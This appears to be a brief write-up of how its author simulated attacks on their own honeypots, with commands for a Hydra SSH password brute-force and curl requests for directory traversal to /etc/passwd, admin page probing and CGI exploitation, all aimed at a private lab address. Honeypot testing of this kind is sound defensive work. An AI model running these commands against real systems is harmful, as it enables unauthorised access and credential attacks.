# Below is how I simulated attacts on my honeypots

 
## I used Hydra to simulate this attack os ssh: 
```bash
hydra -l honeypotuser -P /path/to/your/passwordlist.txt ssh://192.168.1.200:2323
```
This will attempt various passwords for the user honeypotuser on your SSH honeypot. 

## And on Web I used tools like curl to simulate these attacks:

### Directory Traversal:
```bash
 curl "http://192.168.1.200/index.php?page=../../../../etc/passwd"
```
### Admin Page Access:
```bash
 curl "http://192.168.1.200/admin"
```
### Exploiting CGI (if PHP or similar is installed I did do as mine was basic html):
```bash
 curl -X POST "http://192.168.1.200/cgi-bin/php.cgi"
```
